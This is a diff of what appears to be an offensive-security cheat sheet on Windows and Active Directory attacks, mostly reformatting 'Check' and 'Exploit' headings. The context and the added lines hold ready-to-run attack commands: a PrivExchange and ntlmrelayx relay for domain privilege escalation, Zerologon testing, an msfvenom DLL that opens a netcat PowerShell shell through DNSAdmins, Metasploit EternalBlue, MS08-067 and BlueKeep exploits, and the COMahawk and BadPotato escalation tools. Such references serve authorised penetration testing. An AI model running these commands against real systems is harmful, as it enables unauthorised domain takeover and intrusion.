@@ -599,9 +599,7 @@ PS > Remove-ADIDNSNode -DomainController dc1 -Node pc01 -Credential $cred -Verbo
 * [https://github.com/dirkjanm/PrivExchange](https://github.com/dirkjanm/PrivExchange)
 * [https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
 
-
-
-### Check
+Check:
 
 * [https://twitter.com/\_wald0/status/1091062691383238656](https://twitter.com/_wald0/status/1091062691383238656)
 
@@ -610,9 +608,7 @@ $ sudo ./Responder.py -I eth0 -Av
 $ python privexchange.py -d MEGACORP -u snovvcrash -p 'Passw0rd!' -ah 10.10.13.37 -ap '/test/test/test' exch01.megacorp.local --debug
 ```
 
-
-
-### Exploit
+Exploit:
 
 ```
 $ sudo ntlmrelayx.py -t ldap://DC01.megacorp.local --escalate-user snovvcrash
@@ -629,9 +625,7 @@ $ python privexchange.py -d MEGACORP -u snovvcrash -p 'Passw0rd!' -ah 10.10.13.3
 * [https://www.secura.com/uploads/whitepapers/Zerologon.pdf](https://www.secura.com/uploads/whitepapers/Zerologon.pdf)
 * [https://twitter.com/\_dirkjan/status/1306280566313156608](https://twitter.com/_dirkjan/status/1306280566313156608)
 
-
-
-### Check
+Check:
 
 * [https://github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)
 
@@ -639,9 +633,7 @@ $ python privexchange.py -d MEGACORP -u snovvcrash -p 'Passw0rd!' -ah 10.10.13.3
 $ ./zerologon_tester.py DC01 10.10.13.38
 ```
 
-
-
-### Exploit
+Exploit:
 
 * [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
 * [https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472](https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472)
@@ -665,9 +657,7 @@ $ ./dementor.py -d megacorp.local -u snovvcrash -p 'Passw0rd!' 10.10.13.37 DC02.
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
 * [https://adsecurity.org/?p=4064](https://adsecurity.org/?p=4064)
 
-
-
-### Exploit
+Exploit:
 
 ```
 $ msfvenom -p windows/x64/exec cmd='c:\users\snovvcrash\documents\nc.exe 127.0.0.1 1337 -e powershell' -f dll > inject.dll
@@ -676,9 +666,7 @@ PS > Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -N
 PS > (sc.exe \\<HOSTNAME> stop dns) -and (sc.exe \\<HOSTNAME> start dns)
 ```
 
-
-
-### Cleanup
+Cleanup:
 
 ```
 PS > reg delete HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
@@ -2577,8 +2565,7 @@ msf > use auxiliary/scanner/netbios/nbname
 
 **CVE-2008-4250, MS08-067**
 
-
-#### Check
+Check:
 
 ```
 $ sudo nmap -n -Pn -sV --script smb-vuln-ms08-067 10.10.13.37 -p139,445
@@ -2587,8 +2574,7 @@ msf > use exploit/windows/smb/ms08_067_netapi
 msf > check
 ```
 
-
-#### Exploit
+Exploit:
 
 ```
 msf > use exploit/windows/smb/ms08_067_netapi
@@ -2604,7 +2590,7 @@ msf > exploit
 
 #### MSF
 
-##### Check
+Check:
 
 ```
 $ sudo nmap -n -Pn -sV --script smb-vuln-ms17-010 10.10.13.37 -p139,445
@@ -2612,7 +2598,7 @@ Or
 msf > use auxiliary/scanner/smb/smb_ms17_010
 ```
 
-##### Exploit
+Exploit:
 
 ```
 msf > exploit/windows/smb/ms17_010_eternalblue
@@ -2696,15 +2682,13 @@ $ ./exploit.py -t 10.10.13.37 -e pwn.so -s ShareName -r /home/snovvcrash/sharena
 
 **CVE-2019-0708**
 
-
-#### Check
+Check:
 
 ```
 msf > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
 ```
 
-
-#### Exploit
+Exploit:
 
 ```
 msf > exploit/windows/rdp/cve_2019_0708_bluekeep_rce
@@ -4337,6 +4321,19 @@ PS > Stop-Service wuauserv
 
 
 
+### UPnP Device Host Service
+
+**Windows 10, version 1803 < 1809**
+
+* [https://www.programmersought.com/article/35344126658/](https://www.programmersought.com/article/35344126658/)
+* [https://github.com/apt69/COMahawk/releases](https://github.com/apt69/COMahawk/releases)
+
+```
+Cmd > .\COMahawk64.exe "C:\Temp\pwn.exe"
+```
+
+
+
 ### Run as Another User
 
 
@@ -5309,6 +5306,10 @@ Cmd > .\j.exe -l 443 -p C:\Windows\System32\spool\drivers\color\rev.bat -t * -c 
 * [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
 * [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
 * [https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-BadPotato.ps1](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-BadPotato.ps1)
+
+```
+PS > . .\Invoke-BadPotato.ps1; Invoke-BadPotato -Command "C:\Users\snovvcrash\music\pwn.exe"
+```
 
 
 
